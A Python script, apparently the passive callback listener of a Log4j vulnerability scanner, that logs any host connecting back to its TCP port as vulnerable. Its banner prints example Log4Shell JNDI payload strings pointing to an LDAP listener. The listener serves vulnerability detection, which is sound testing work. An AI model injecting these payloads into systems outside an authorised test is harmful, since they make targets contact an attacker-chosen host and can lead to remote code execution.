#!/usr/bin/env python3
import argparse, socket, sys, threading, time
from datetime import datetime
from termcolor import cprint

###
class ClientThread(threading.Thread):
  def __init__(self, ip, port, csocket):
    threading.Thread.__init__(self)
    self.ip = ip
    self.port = port
    self.csocket = csocket
    now = datetime.now()
    now = now.strftime("%d/%m/%Y %H:%M:%S")
    cprint("[!] Confirmed vulnerability (%s): %s is vulnerable" % (now, self.ip), 'red', attrs=['bold'])

###
def main():

  if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)
  
  parser = argparse.ArgumentParser()
  parser.add_argument('--tcp_port', action='store', dest='tcp_port', required=True, help='TCP port of the "LDAP" listening socket')
  args = parser.parse_args()

  _tcp_port = int(args.tcp_port)

  print('')
  cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
  cprint('[•] Author: Julien GARAVET', 'green')
  cprint('[•] + Passive Callback Module aka PCM', 'green')
  cprint('[•] + Active  Callback Module aka ACM', 'green')
  cprint('[•] + Active  Scanner  Module aka ASM', 'green')
  print('')
  cprint('[*] PCM - Passive Callback Module - Intels', 'green', attrs=['bold'])
  cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://192.168.1.242:1389/a}', 'green')
  cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#192.168.1.242:1389/a}', 'green')
  time.sleep(4)
  print('')
  cprint('[+] PCM - Passive Callback Module - Settings', 'yellow', attrs=['bold'])
  cprint(f'[+] TCP_port     TCP/{_tcp_port}', 'yellow')
  time.sleep(2)
  print('')
  cprint('[!] PCM - Passive Callback Module - Starting', 'cyan', attrs=['bold'])
  time.sleep(2)
  cprint('[!] Waiting for targets connections', 'cyan')
  ssocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  ssocket.bind(("", _tcp_port))

  while True:
    ssocket.listen(10)
    (csocket, (ip, port)) = ssocket.accept()
    thread = ClientThread(ip, port, csocket)
    thread.start()

if __name__ == "__main__":
  main()


"""
class ClientThread(threading.Thread):

    def __init__(self, ip, port, clientsocket):

        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.clientsocket = clientsocket
        now = datetime.now()
        now = now.strftime("%d/%m/%Y %H:%M:%S")
        print("[!] %s - %s is vulnerable" % (now, self.ip))

tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
tcpsock.bind(("",1389))

while True:
    tcpsock.listen(10)
    (clientsocket, (ip, port)) = tcpsock.accept()
    newthread = ClientThread(ip, port, clientsocket)
    newthread.start()
"""
